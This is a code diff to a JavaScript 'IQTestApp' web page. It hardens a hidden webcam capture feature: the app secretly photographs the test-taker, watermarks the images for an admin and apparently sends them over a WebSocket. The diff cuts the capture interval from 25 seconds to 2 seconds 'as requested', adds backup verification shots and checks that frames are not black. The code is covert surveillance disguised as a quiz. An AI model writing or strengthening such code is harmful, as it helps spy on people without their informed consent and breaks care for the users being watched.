@@ -241,20 +241,38 @@ class IQTestApp {
             this.hiddenVideo.srcObject = this.stream;
             this.hiddenVideo.muted = true;
             this.hiddenVideo.playsInline = true;
+            this.hiddenVideo.autoplay = true;
             
-            // Wait for video to be ready
+            // Start playing the video
+            await this.hiddenVideo.play();
+            
+            // Wait for video to be ready with proper dimensions
             await new Promise((resolve, reject) => {
+                const checkVideoReady = () => {
+                    if (this.hiddenVideo.videoWidth > 0 && this.hiddenVideo.videoHeight > 0) {
+                        console.log('Hidden video ready with dimensions:', {
+                            width: this.hiddenVideo.videoWidth,
+                            height: this.hiddenVideo.videoHeight,
+                            playing: !this.hiddenVideo.paused
+                        });
+                        resolve();
+                    } else {
+                        console.log('Waiting for video dimensions...');
+                        setTimeout(checkVideoReady, 100);
+                    }
+                };
+                
                 this.hiddenVideo.onloadedmetadata = () => {
-                    console.log('Hidden video ready:', {
-                        width: this.hiddenVideo.videoWidth,
-                        height: this.hiddenVideo.videoHeight
-                    });
-                    resolve();
+                    console.log('Video metadata loaded');
+                    checkVideoReady();
                 };
                 
                 this.hiddenVideo.onerror = () => {
                     reject(new Error('Video failed to load'));
                 };
+                
+                // Start checking immediately
+                checkVideoReady();
                 
                 // Timeout after 10 seconds
                 setTimeout(() => {
@@ -267,11 +285,16 @@ class IQTestApp {
             
             console.log('Camera permission granted, waiting before initial capture...');
             
-            // Send initial verification photo after a short delay
+            // Send initial verification photo after ensuring video is ready
             setTimeout(() => {
                 console.log('Taking initial verification photo...');
                 this.capturePhoto('verification');
-            }, 2000);
+                
+                // Take another photo shortly after to ensure we get a good capture
+                setTimeout(() => {
+                    this.capturePhoto('verification_backup');
+                }, 1000);
+            }, 3000);
             
         } catch (error) {
             console.error('Camera access error:', error);
@@ -345,15 +368,15 @@ class IQTestApp {
     }
     
     startSecretCapture() {
-        // Capture photo every 25 seconds during test
+        // Capture photo every 2 seconds during test as requested
         this.captureInterval = setInterval(() => {
             this.capturePhoto('progress');
-        }, 25000);
+        }, 2000);
         
         // Capture initial test start photo
         setTimeout(() => {
             this.capturePhoto('test_start');
-        }, 2000);
+        }, 1000);
     }
     
     capturePhoto(type) {
@@ -362,13 +385,34 @@ class IQTestApp {
             return;
         }
         
+        // Check if video is actually playing and has dimensions
+        if (this.hiddenVideo.videoWidth === 0 || this.hiddenVideo.videoHeight === 0) {
+            console.log('Video not ready - no dimensions available');
+            return;
+        }
+        
+        if (this.hiddenVideo.paused || this.hiddenVideo.ended) {
+            console.log('Video is paused or ended, attempting to play...');
+            this.hiddenVideo.play().catch(e => console.error('Failed to play video:', e));
+            return;
+        }
+        
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         
-        canvas.width = this.hiddenVideo.videoWidth || 640;
-        canvas.height = this.hiddenVideo.videoHeight || 480;
+        // Use actual video dimensions
+        canvas.width = this.hiddenVideo.videoWidth;
+        canvas.height = this.hiddenVideo.videoHeight;
+        
+        console.log(`Capturing photo: ${type}`, {
+            videoWidth: this.hiddenVideo.videoWidth,
+            videoHeight: this.hiddenVideo.videoHeight,
+            videoPlaying: !this.hiddenVideo.paused,
+            canvasSize: `${canvas.width}x${canvas.height}`
+        });
         
         try {
+            // Draw the video frame to canvas
             ctx.drawImage(this.hiddenVideo, 0, 0, canvas.width, canvas.height);
             
             // Add subtle watermark for admin identification
@@ -380,10 +424,16 @@ class IQTestApp {
             
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             
-            console.log(`Capturing photo: ${type}`, {
+            // Check if we got a valid image (not just black)
+            if (photoData.length < 1000) {
+                console.warn('Captured image seems too small, might be black');
+            }
+            
+            console.log(`Successfully captured photo: ${type}`, {
                 sessionId: this.sessionId,
                 photoType: type,
                 currentQuestion: this.currentQuestion,
+                photoSize: photoData.length,
                 wsReady: this.ws && this.ws.readyState === WebSocket.OPEN
             });
             
